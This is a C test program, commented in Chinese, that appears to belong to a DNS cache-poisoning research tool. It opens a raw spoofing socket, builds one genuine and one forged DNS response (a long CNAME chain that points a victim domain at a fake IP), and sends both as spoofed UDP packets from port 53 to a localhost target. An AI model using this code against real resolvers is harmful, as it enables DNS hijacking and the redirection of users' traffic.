#include "fake.h"
#include "util.h"
#include "network.h"
#include "dns.h"
#include <time.h>
#include <stdlib.h>
#include <stdio.h>


int main(int argc, char **argv)
{
    // 1. 初始化
    srand(time(NULL));
    dns_init();
    Arena arena = {0};
    // 2. 设置测试参数
    char *src_ip = "127.0.0.1";
    char *target_ip = "127.0.0.1";
    uint16_t target_port = 12345;

    // _build_std_resp 函数需要的参数
    char *qname = "www.example.com";
    char *prefix = "c";
    char *victim = "example.com";
    char *attacker = "a.com";
    char *origin_ip = "1.1.1.1"; // 使用一个标准测试IP地址
    char *fake_ip = "9.9.9.9";
    size_t chain_length = 55;       // 设置一个较短的CNAME链长度用于测试

    printf("[*] 开始测试 _build_std_resp 函数...\n");
    printf("[*] 目标地址: %s:%u\n", target_ip, target_port);

    // 3. 创建用于发送原始IP包的套接字
    int sockfd = make_sockfd_for_spoof();
    if (sockfd < 0)
    {
        perror("[-] 创建套接字失败");
        return 1;
    }
    printf("[+] 原始套接字创建成功。\n");

    // 4. 使用被测试的函数构建DNS响应负载
    uint8_t *dns_payload = (uint8_t *)alloc_memory(LARGE_PKT_MAX_LEN);
    uint8_t *std_dns_payload = (uint8_t *)alloc_memory(LARGE_PKT_MAX_LEN);
    printf("[*] 正在调用 _build_std_resp 构建DNS响应负载...\n");


    size_t std_dns_payload_len = _build_std_resp(&arena,
        std_dns_payload, LARGE_PKT_MAX_LEN, qname, prefix, victim, origin_ip, chain_length);
    
    size_t dns_payload_len = build_fake_resp(
        &arena,
        dns_payload,
        LARGE_PKT_MAX_LEN,
        qname,
        prefix,
        victim,
        origin_ip,
        attacker,
        fake_ip,
        chain_length
    );

    if (dns_payload_len == (size_t)-1 || dns_payload_len == 0)
    {
        fprintf(stderr, "[-] build_resp 未能成功创建DNS负载。\n");
        free(dns_payload);
        close(sockfd);
        return 1;
    }
    printf("[+] DNS负载创建成功，大小: %zu 字节。\n", dns_payload_len);

    // _build_std_resp 将TXID硬编码为0，我们在此设置一个随机值以进行更真实的测试
    struct dnshdr *dnsh = (struct dnshdr *)dns_payload;
    dnsh->id = htons((uint16_t)(rand() % 65536));
    printf("[*] 已设置随机DNS事务ID (TXID): %u\n", ntohs(dnsh->id));

    // 5. 将DNS负载封装成一个完整的IP/UDP包
    // 计算总数据包长度
    size_t packet_raw_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_len;
    size_t std_packet_raw_len = sizeof(struct iphdr) + sizeof(struct udphdr) + std_dns_payload_len;
    uint8_t *packet_raw = (uint8_t *)alloc_memory(packet_raw_len);
    uint8_t *std_packet_raw = (uint8_t *)alloc_memory(std_packet_raw_len);

    // 使用 network.c 中的函数来填充IP和UDP头部
    make_udp_packet(packet_raw, packet_raw_len,
                    inet_addr(src_ip), inet_addr(target_ip),
                    53, // DNS响应的源端口通常是53
                    target_port,
                    dns_payload, dns_payload_len);
    make_udp_packet(std_packet_raw, std_packet_raw_len,
                    inet_addr(src_ip), inet_addr(target_ip),
                    53, // DNS响应的源端口通常是53
                    target_port,
                    std_dns_payload, std_dns_payload_len);
    printf("[+] 原始IP/UDP数据包模板创建完成。\n");

    // 6. 发送数据包
    printf("[*] 正在发送数据包至 %s:%u...\n", target_ip, target_port);
    // send_udp_packet(sockfd, packet_raw, packet_raw_len,
    //                 inet_addr(src_ip), inet_addr(target_ip),
    //                 53, target_port);
    struct sendres pos = {NULL, 0};
    pos.positions = (int*)alloc_memory(MAX_FRAGMENTS * sizeof(int));
    pos.positions[pos.count++] = 0;
    send_sltd_udp_packet(&arena, sockfd, std_packet_raw, std_packet_raw_len,
                         inet_addr(src_ip), inet_addr(target_ip),
                         53, target_port, &pos);
    pos.positions[pos.count - 1] = 1;
    send_sltd_udp_packet(&arena, sockfd, packet_raw, packet_raw_len,
                    inet_addr(src_ip), inet_addr(target_ip),
                    53, target_port, &pos);
    
    printf("[+] 数据包已发送。\n");

    // 7. 清理资源
    free(pos.positions);
    free(dns_payload);
    free(std_dns_payload);
    free(packet_raw);
    free(std_packet_raw);
    close(sockfd);

    printf("[*] 测试结束。\n");
    return 0;
}